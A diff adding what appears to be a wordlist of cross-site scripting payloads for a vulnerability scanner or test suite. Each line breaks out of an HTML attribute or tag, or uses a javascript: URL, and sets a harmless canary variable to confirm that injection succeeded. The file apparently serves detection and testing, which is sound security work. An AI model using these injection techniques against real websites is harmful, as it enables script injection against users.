@@ -1,0 +1,16 @@
+" onfocus=window._xss_confirmed='CANARY' autofocus="
+' onfocus=window._xss_confirmed='CANARY' autofocus='
+" onmouseover=window._xss_confirmed='CANARY' "
+' onmouseover=window._xss_confirmed='CANARY' '
+" onclick=window._xss_confirmed='CANARY' "
+' onclick=window._xss_confirmed='CANARY' '
+" onerror=window._xss_confirmed='CANARY' src=x "
+" onload=window._xss_confirmed='CANARY' "
+"><img src=x onerror=window._xss_confirmed='CANARY'>
+'><img src=x onerror=window._xss_confirmed='CANARY'>
+"><svg onload=window._xss_confirmed='CANARY'>
+'><svg onload=window._xss_confirmed='CANARY'>
+" autofocus onfocus=window._xss_confirmed='CANARY' x="
+' autofocus onfocus=window._xss_confirmed='CANARY' x='
+"//onfocus=window._xss_confirmed='CANARY'//autofocus//
+javascript:window._xss_confirmed='CANARY'
